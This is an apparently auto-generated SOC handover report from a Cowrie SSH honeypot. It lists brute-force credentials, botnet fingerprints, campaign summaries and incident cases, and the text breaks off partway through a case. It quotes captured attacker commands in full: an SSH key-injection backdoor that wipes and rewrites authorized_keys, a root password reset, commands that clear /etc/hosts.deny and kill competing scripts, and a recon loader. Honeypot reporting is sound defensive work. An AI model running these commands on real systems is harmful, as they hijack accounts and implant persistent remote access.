# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-10-22 |
| **Generated At** | 2026-10-22T16:17:53Z |
| **Shift Time** | 16:17 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **373** |
| Confirmed Threats | **315** |
| False Positives Filtered | **58** (15.6%) |
| Unique Attacker IPs | **220** |
| Countries of Origin | **50** |
| High Severity Cases | **187** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **186** |
| Malware Samples Analyzed | **7** HIGH · **25** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **4461** |
| Unique Credential Pairs | **1748** |
| Unique Usernames | **544** |
| Unique Passwords | **1022** |
| Successful Auth Pairs | **4308** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 1305 |
| `ubuntu` | 135 |
| `345gs5662d34` | 117 |
| `admin` | 115 |
| `user` | 91 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 297 |
| `123` | 122 |
| `345gs5662d34` | 117 |
| `3245gs5662d34` | 117 |
| `1234` | 94 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 117 |
| `root` | `3245gs5662d34` | 28 |
| `support` | `support` | 28 |
| `root` | `` | 16 |
| `admin` | `admin` | 11 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `developer` | `1` | `195.178.110.228` | 2026-10-22T00:56:30 |
| `root` | `Administrat0r` | `94.184.10.185` | 2026-10-22T00:57:07 |
| `345gs5662d34` | `345gs5662d34` | `94.184.10.185` | 2026-10-22T00:57:12 |
| `root` | `3245gs5662d34` | `94.184.10.185` | 2026-10-22T00:57:14 |
| `admin` | `QWEasd123!` | `185.158.22.150` | 2026-10-22T00:57:34 |
| `345gs5662d34` | `345gs5662d34` | `185.158.22.150` | 2026-10-22T00:57:37 |
| `admin` | `3245gs5662d34` | `185.158.22.150` | 2026-10-22T00:57:39 |
| `developer` | `123` | `195.178.110.228` | 2026-10-22T00:58:19 |
| `support` | `support` | `10.0.0.73` | 2026-10-22T01:02:40 |
| `root` | `qazwsxedc` | `145.239.89.124` | 2026-10-22T01:02:55 |
| `345gs5662d34` | `345gs5662d34` | `145.239.89.124` | 2026-10-22T01:02:58 |
| `root` | `3245gs5662d34` | `145.239.89.124` | 2026-10-22T01:02:59 |
| `test1` | `P@ssw0rdP@ssw0rd` | `201.63.223.138` | 2026-10-22T01:03:56 |
| `345gs5662d34` | `345gs5662d34` | `201.63.223.138` | 2026-10-22T01:03:59 |
| `test1` | `3245gs5662d34` | `201.63.223.138` | 2026-10-22T01:04:00 |
| `root` | `` | `94.154.43.196` | 2026-10-22T01:10:11 |
| `ubuntu` | `B1ockch@in` | `10.0.0.73` | 2026-10-22T01:12:56 |
| `ubuntu` | `B1ockch@in` | `45.148.10.61` | 2026-10-22T01:13:16 |
| `sol` | `sol` | `2.57.122.238` | 2026-10-22T01:25:20 |
| `solana` | `solana` | `2.57.122.238` | 2026-10-22T01:27:05 |
_… 4288 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **373** |
| Sessions with Fingerprint | **32** |
| Unique HASSH Fingerprints | **32** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 149 |
| Go SSH scanner | 50 |
| OpenSSH | 10 |
| Unknown | 6 |
| Paramiko (Python) | 6 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 128 | 64 |
| `16443846184e...` | Generic scanner | 11 | 5 |
| `0a07365cc01f...` | Generic scanner | 8 | 3 |
| `eff4c24daffc...` | Modern SSH client | 7 | 1 |
| `98f63c4d9c87...` | Generic scanner | 7 | 7 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 128 | 64 | Mirai/variant |
| `95420f9d932d...` | libssh | 11 | 11 | — |
| `16443846184e...` | Go SSH scanner | 11 | 5 | Generic scanner |
| `0a07365cc01f...` | Go SSH scanner | 8 | 3 | Generic scanner |
| `eff4c24daffc...` | Go SSH scanner | 7 | 1 | Modern SSH client |
| `98f63c4d9c87...` | Go SSH scanner | 7 | 7 | Generic scanner |
| `390ffe68a68c...` | OpenSSH | 6 | 2 | Modern SSH client |
| `2ec37a7cc8da...` | Go SSH scanner | 5 | 2 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **14** |
| Campaign Clusters | **4** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **Recon Loader Script** | 🟡 MEDIUM | 187 | 2 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 2 | 2 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 58 | 55 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:p2g4DV7gXaFA"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `103.255.200.90`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `2.57.122.74`, `195.178.110.228`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `176.65.132.132`, `94.154.43.196`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **220** |
| Unique ASNs | **106** |
| High-Risk ASNs | **79** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 45 | HIGH |
| `AS396982` | Google LLC | 16 | HIGH |
| `AS4766` | Korea Telecom | 14 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 8 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 7 | HIGH |
| `AS63949` | Akamai Connected Cloud | 6 | HIGH |
| `AS6939` | Hurricane Electric LLC | 4 | HIGH |
| `AS8075` | Microsoft Corporation | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (182)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-14badb897be8

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-10-22 00:56 |
| **Last Seen** | 2026-10-22 00:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-22 00:56:28` | `cowrie.session.connect` |
| `2026-10-22 00:56:28` | `cowrie.client.version` |
| `2026-10-22 00:56:28` | `cowrie.client.kex` |
| `2026-10-22 00:56:30` | `cowrie.login.success` |
| `2026-10-22 00:56:31` | `cowrie.session.params` |
| `2026-10-22 00:56:31` | `cowrie.command.input` |
| `2026-10-22 00:56:31` | `cowrie.command.input` |
| `2026-10-22 00:56:31` | `cowrie.command.input` |
| `2026-10-22 00:56:31` | `cowrie.command.input` |
| `2026-10-22 00:56:31` | `cowrie.command.input` |
| `2026-10-22 00:56:31` | `cowrie.command.success` |
| `2026-10-22 00:56:31` | `cowrie.command.input` |
| `2026-10-22 00:56:31` | `cowrie.command.input` |
| `2026-10-22 00:56:31` | `cowrie.command.input` |
| `2026-10-22 00:56:31` | `cowrie.command.input` |
| … | _5 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfc9f3326bb4

| Field | Detail |
|---|---|
| **Source IP** | `94.184.10[.]185` |
| **First Seen** | 2026-10-22 00:57 |
| **Last Seen** | 2026-10-22 00:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-22 00:57:06` | `cowrie.session.connect` |
| `2026-10-22 00:57:06` | `cowrie.client.version` |
| `2026-10-22 00:57:06` | `cowrie.client.kex` |
| `2026-10-22 00:57:07` | `cowrie.login.success` |
| `2026-10-22 00:57:09` | `cowrie.session.params` |
| `2026-10-22 00:57:09` | `cowrie.command.input` |
| `2026-10-22 00:57:09` | `cowrie.command.failed` |
| `2026-10-22 00:57:10` | `cowrie.log.closed` |
| `2026-10-22 00:57:11` | `cowrie.session.params` |
| `2026-10-22 00:57:11` | `cowrie.command.input` |
| `2026-10-22 00:57:11` | `cowrie.session.file_download` |
| `2026-10-22 00:57:11` | `cowrie.log.closed` |
| `2026-10-22 00:57:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.184.10[.]185` to AbuseIPDB if not already reported
- [ ] Block `94.184.10[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce1737b2d4d8

| Field | Detail |
|---|---|
| **Source IP** | `94.184.10[.]185` |
| **First Seen** | 2026-10-22 00:57 |
| **Last Seen** | 2026-10-22 00:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-22 00:57:11` | `cowrie.session.connect` |
| `2026-10-22 00:57:12` | `cowrie.client.version` |
| `2026-10-22 00:57:12` | `cowrie.client.kex` |
| `2026-10-22 00:57:12` | `cowrie.login.success` |
| `2026-10-22 00:57:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.184.10[.]185` to AbuseIPDB if not already reported
- [ ] Block `94.184.10[.]185` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d91ecf82ed47

| Field | Detail |
|---|---|
| **Source IP** | `185.158.22[.]150` |
| **First Seen** | 2026-10-22 00:57 |
| **Last Seen** | 2026-10-22 00:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-22 00:57:33` | `cowrie.session.connect` |
| `2026-10-22 00:57:33` | `cowrie.client.version` |
| `2026-10-22 00:57:34` | `cowrie.client.kex` |
| `2026-10-22 00:57:34` | `cowrie.login.success` |
| `2026-10-22 00:57:35` | `cowrie.session.params` |
| `2026-10-22 00:57:35` | `cowrie.command.input` |
| `2026-10-22 00:57:35` | `cowrie.command.failed` |
| `2026-10-22 00:57:35` | `cowrie.log.closed` |
| `2026-10-22 00:57:36` | `cowrie.session.params` |
| `2026-10-22 00:57:36` | `cowrie.command.input` |
| `2026-10-22 00:57:36` | `cowrie.session.file_download` |
| `2026-10-22 00:57:36` | `cowrie.log.closed` |
| `2026-10-22 00:57:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.158.22[.]150` to AbuseIPDB if not already reported
- [ ] Block `185.158.22[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c6ad3c2ed09

| Field | Detail |
|---|---|
| **Source IP** | `185.158.22[.]150` |
| **First Seen** | 2026-10-22 00:57 |
| **Last Seen** | 2026-10-22 00:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-22 00:57:37` | `cowrie.session.connect` |
| `2026-10-22 00:57:37` | `cowrie.client.version` |
| `2026-10-22 00:57:37` | `cowrie.client.kex` |
| `2026-10-22 00:57:37` | `cowrie.login.success` |
| `2026-10-22 00:57:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.158.22[.]150` to AbuseIPDB if not already reported
- [ ] Block `185.158.22[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ddf4751c485

| Field | Detail |
|---|---|
| **Source IP** | `145.239.89[.]124` |
| **First Seen** | 2026-10-22 01:02 |
| **Last Seen** | 2026-10-22 01:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-22 01:02:55` | `cowrie.session.connect` |
| `2026-10-22 01:02:55` | `cowrie.client.version` |
| `2026-10-22 01:02:55` | `cowrie.client.kex` |
| `2026-10-22 01:02:55` | `cowrie.login.success` |
| `2026-10-22 01:02:56` | `cowrie.session.params` |
| `2026-10-22 01:02:56` | `cowrie.command.input` |
| `2026-10-22 01:02:56` | `cowrie.command.failed` |
| `2026-10-22 01:02:56` | `cowrie.log.closed` |
| `2026-10-22 01:02:57` | `cowrie.session.params` |
| `2026-10-22 01:02:57` | `cowrie.command.input` |
| `2026-10-22 01:02:57` | `cowrie.session.file_download` |
| `2026-10-22 01:02:57` | `cowrie.log.closed` |
| `2026-10-22 01:02:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `145.239.89[.]124` to AbuseIPDB if not already reported
- [ ] Block `145.239.89[.]124` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fff6f86e343a

| Field | Detail |
|---|---|
| **Source IP** | `145.239.89[.]124` |
| **First Seen** | 2026-10-22 01:02 |
| **Last Seen** | 2026-10-22 01:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-22 01:02:57` | `cowrie.session.connect` |
| `2026-10-22 01:02:57` | `cowrie.client.version` |
| `2026-10-22 01:02:57` | `cowrie.client.kex` |
| `2026-10-22 01:02:58` | `cowrie.login.success` |
| `2026-10-22 01:02:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `145.239.89[.]124` to AbuseIPDB if not already reported
- [ ] Block `145.239.89[.]124` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82413c547278

| Field | Detail |
|---|---|
| **Source IP** | `201.63.223[.]138` |
| **First Seen** | 2026-10-22 01:03 |
| **Last Seen** | 2026-10-22 01:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-22 01:03:55` | `cowrie.session.connect` |
| `2026-10-22 01:03:55` | `cowrie.client.version` |
| `2026-10-22 01:03:55` | `cowrie.client.kex` |
| `2026-10-22 01:03:56` | `cowrie.login.success` |
| `2026-10-22 01:03:57` | `cowrie.session.params` |
| `2026-10-22 01:03:57` | `cowrie.command.input` |
| `2026-10-22 01:03:57` | `cowrie.command.failed` |
| `2026-10-22 01:03:57` | `cowrie.log.closed` |
| `2026-10-22 01:03:58` | `cowrie.session.params` |
| `2026-10-22 01:03:58` | `cowrie.command.input` |
| `2026-10-22 01:03:58` | `cowrie.session.file_download` |
| `2026-10-22 01:03:58` | `cowrie.log.closed` |
| `2026-10-22 01:04:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.63.223[.]138` to AbuseIPDB if not already reported
- [ ] Block `201.63.223[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3487d59c0905

| Field | Detail |
|---|---|
| **Source IP** | `201.63.223[.]138` |
| **First Seen** | 2026-10-22 01:03 |
| **Last Seen** | 2026-10-22 01:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-22 01:03:58` | `cowrie.session.connect` |
| `2026-10-22 01:03:58` | `cowrie.client.version` |
| `2026-10-22 01:03:58` | `cowrie.client.kex` |
| `2026-10-22 01:03:59` | `cowrie.login.success` |
| `2026-10-22 01:03:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.63.223[.]138` to AbuseIPDB if not already reported
- [ ] Block `201.63.223[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9e8dd432a07

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]196` |
| **First Seen** | 2026-10-22 01:10 |
| **Last Seen** | 2026-10-22 01:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-22 01:10:11` | `cowrie.session.connect` |
| `2026-10-22 01:10:11` | `cowrie.login.success` |
| `2026-10-22 01:10:12` | `cowrie.session.params` |
| `2026-10-22 01:10:12` | `cowrie.command.input` |
| `2026-10-22 01:10:13` | `cowrie.command.input` |
| `2026-10-22 01:10:14` | `cowrie.command.input` |
| `2026-10-22 01:10:14` | `cowrie.command.input` |
| `2026-10-22 01:10:14` | `cowrie.command.failed` |
| `2026-10-22 01:10:15` | `cowrie.log.closed` |
| `2026-10-22 01:10:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]196` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f050e4e95a1a

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]61` |
| **First Seen** | 2026-10-22 01:13 |
| **Last Seen** | 2026-10-22 01:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-22 01:13:16` | `cowrie.session.connect` |
| `2026-10-22 01:13:16` | `cowrie.client.version` |
| `2026-10-22 01:13:16` | `cowrie.client.kex` |
| `2026-10-22 01:13:16` | `cowrie.login.success` |
| `2026-10-22 01:13:17` | `cowrie.session.params` |
| `2026-10-22 01:13:17` | `cowrie.command.input` |
| `2026-10-22 01:13:17` | `cowrie.log.closed` |
| `2026-10-22 01:13:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]61` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eee25e56a641

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-10-22 01:25 |
| **Last Seen** | 2026-10-22 01:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-22 01:25:20` | `cowrie.session.connect` |
| `2026-10-22 01:25:20` | `cowrie.client.version` |
| `2026-10-22 01:25:20` | `cowrie.client.kex` |
| `2026-10-22 01:25:20` | `cowrie.login.success` |
| `2026-10-22 01:25:21` | `cowrie.session.params` |
| `2026-10-22 01:25:21` | `cowrie.command.input` |
| `2026-10-22 01:25:21` | `cowrie.log.closed` |
| `2026-10-22 01:25:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1556432a448d

| Field | Detail |
|---|---|
| **Source IP** | `134.209.235[.]214` |
| **First Seen** | 2026-10-22 01:27 |
| **Last Seen** | 2026-10-22 01:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
